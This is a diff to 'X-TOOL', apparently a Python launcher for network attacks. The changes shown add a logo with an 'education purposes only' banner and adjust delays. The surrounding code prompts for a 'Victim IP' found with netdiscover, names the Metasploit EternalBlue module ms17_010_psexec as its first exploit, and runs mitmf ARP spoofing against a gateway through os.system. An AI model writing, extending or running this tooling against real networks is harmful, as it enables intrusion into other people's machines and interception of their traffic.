@@ -4,8 +4,18 @@ import os, time, subprocess
 from pathlib import Path
 from scapy.all import *
 from contextlib import contextmanager, redirect_stdout
+logo = '''
+            __  __          _____ ___   ___  _     
+            \ \/ /         |_   _/ _ \ / _ \| |    
+             \  /   _____    | || | | | | | | |    
+             /  \  |_____|   | || |_| | |_| | |___ 
+            /_/\_\           |_| \___/ \___/|_____|
+            ######################################
+            # Use it for EDUCATION PURPOSES only #                        
+            ######################################
+'''
+print(logo)
 Interface = input('[*]Write Name of your Internet Access Interface, (Example: wlan0):')
-time.sleep(5)
 print('')
 print('[*]Make sure for you installed this programs!')       #Programs and Tools must be installed.
 print('[*]Metasploit Framework')
@@ -14,7 +24,6 @@ print('[*]Ngrok')
 print('[*]postgresql')
 print('[*]This exploit/windows/smb/ms17_010_psexec, You must download this from network and copy file in Metasploit folder/smb')
 print('')
-time.sleep(5)
 print('')
 print('[*] X-TOOL Exploits:')
 print('[1] Eternal Blue')
@@ -27,12 +36,12 @@ query = input("[*] Choose exploit!:").lower()
 if query.startswith('1'):
 	print('Check and remember Victim IP!')
 	print('CTRL + C to Stop Scaning!')
-	time.sleep(5)
+	time.sleep(3)
 	Ipcheck = ('netdiscover -i ') + (Interface)
 	os.system(Ipcheck)
 	Victim = input('[*]Write Victim IP!:')
 	print('Check and remember your local IP!:')
-	time.sleep(5)
+	time.sleep(3)
 	Ipcheck2 = ('ifconfig ') + (Interface)
 	os.system(Ipcheck2)
 	Local = input('[*]Write your Local IP address!:')	
@@ -85,3 +94,6 @@ if query.startswith('5'):
 	RouterIP = input('Enter Gateway IP!:')
 	MITM = ('python mitmf.py -i ') + (Interface) + (' --spoof --arp --gateway ') + (RouterIP) + (' --upsidedownternet')
 	os.system(MITM)
+else:
+	print('')
+	print('[X] Sorry, Something is Wrong!')
